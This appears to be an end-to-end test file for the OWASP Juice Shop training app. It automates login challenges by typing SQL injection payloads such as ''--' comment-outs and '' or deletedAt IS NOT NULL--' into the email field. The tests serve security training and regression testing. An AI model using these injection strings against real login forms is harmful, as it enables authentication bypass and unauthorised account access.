

const config = require('config')
describe('/#/login', () => {
  let email, password, loginButton

  beforeEach(() => {
    browser.get('/#/login')
    email = element(by.id('email'))
    password = element(by.id('password'))
    loginButton = element(by.id('loginButton'))
  })
  describe('challenge "loginJim"', () => {
    it('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', () => {
      email.sendKeys('jim@' + config.get('application.domain') + '\'--')
      password.sendKeys('a')
      loginButton.click()
      browser.sleep(3000)
    }) 
  })
  
  describe('challenge "ghostLogin"', () => {
    it('should be able to log in as chris.pike@juice-sh.op by using `\' or deletedAt IS NOT NULL --`', () => {
      email.sendKeys('\' or deletedAt IS NOT NULL--')
      password.sendKeys('a')
      loginButton.click()
    })

    it('should be able to log in as chris.pike@juice-sh.op by using `chris.pike@juice-sh.op\' --`', () => {
      email.sendKeys('chris.pike@' + 'juice-sh.op' + '\'--')
      password.sendKeys('a')
      loginButton.click()
    })

    
  })


})
